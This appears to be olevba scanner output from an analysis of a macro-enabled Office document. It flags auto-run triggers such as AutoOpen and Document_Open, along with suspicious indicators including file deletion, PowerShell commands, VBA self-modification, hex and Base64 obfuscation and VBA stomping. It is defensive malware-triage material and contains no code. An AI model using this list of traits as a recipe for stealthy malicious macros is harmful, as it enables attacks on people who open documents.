|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButtonNothing|Runs when the file is opened and ActiveX     |
|          |_Click              |objects trigger events                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

